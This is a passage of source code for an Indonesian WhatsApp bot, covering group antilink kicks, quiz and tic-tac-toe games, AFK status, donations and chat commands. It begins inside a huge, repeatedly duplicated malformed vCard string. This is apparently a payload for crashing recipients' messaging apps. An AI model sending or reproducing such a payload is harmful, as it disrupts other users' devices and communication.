karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
        
        // Public & Self
        if (!danta.public) {
            if (!m.key.fromMe) return
        }
        if (m.message) {
            danta.readMessages([m.key])
        }

//Premium Exp
prem.expiredCheck(danta, m, premium);

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
// total hit
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/naze-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/naze-md${moment.tz('Asia/Jakarta').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await danta.setStatus(`${naze.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        kice = m.sender
        m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`)
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await danta.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`)
        if (isAdmins) return m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`)
        if (isCreator) return m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`)
        danta.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }


        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: danta.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, danta.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        danta.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            danta.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await danta.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, danta.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ╠➥ ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await danta.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, danta.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await danta.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, danta.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await danta.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, danta.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await danta.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, danta.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await danta.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, danta.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await danta.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, danta.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await danta.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await danta.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    danta.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    danta.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) danta.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) danta.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) danta.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    danta.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) danta.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) danta.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    danta.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }
        
        if (!m.message)
        return
    this.spam = this.spam ? this.spam : {}
    if (m.sender in this.spam) {
        this.spam[m.sender].count++
        if (m.messageTimestamp.toNumber() - this.spam[m.sender].lastspam > 10) {
            if (this.spam[m.sender].count > 10) {
                //global.db.data.users[m.sender].banned = true
                m.reply('*Jangan Spam!!*')
            }
            this.spam[m.sender].count = 0
            this.spam[m.sender].lastspam = m.messageTimestamp.toNumber()
        }
    }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} *Telah Afk*${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
        	if (!m.isGroup) throw mess.group
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await danta.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await danta.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ╠➥ ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            danta.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ╠➥ ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *menantang* @${m.mentionedJid[0].split`@`[0]} *untuk bermain suit*

*Silahkan* @${m.mentionedJid[0].split`@`[0]} *untuk ketik terima/tolak*`
            this.suit[id] = {
            chat: await danta.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) danta.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
                danta.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/9af8741c2fa298e8cc742.jpg' }, caption: `*${ucapanWaktu} Kak ${m.pushName}*\n\n *Jika ingin berdonasi silahkan chat no di bawah*\n\n*Jika ingin sewa bot atau premium*\n*Silahkan Chat Owner*\n\n*Atau Transfer via*\n- *Gopay Dana Ovo ShopeePay*\n berikut : 62 821-9325-2764\n\n_Terima kasih_` }, { quoted: m })
         }
         break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    danta.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    danta.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    danta.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    danta.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    danta.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    danta.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    danta.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
        case 'luas-segitiga':
fakey(mess.wait)
if (!q) return m.reply(`untuk mencari hasil dari luas segitiga\nGunakan ${prefix}luassegitiga alas tinggi\ncontoh: ${prefix}luas-segitiga 12 7`)
if (!isInventoryLimit){ addInventoriLimit(m.sender) }
try {
const luasseg = bdr.datar.luas.segitiga(args[0], args[1], false)
const caraluas = bdr.datar.luas.segitiga(args[0], args[1], true)
m.reply(`*Hasil:* ${luasseg}\n${caraluas}`)
} catch (err) {
m.reply('Format pesannya salah tuh')
}
break
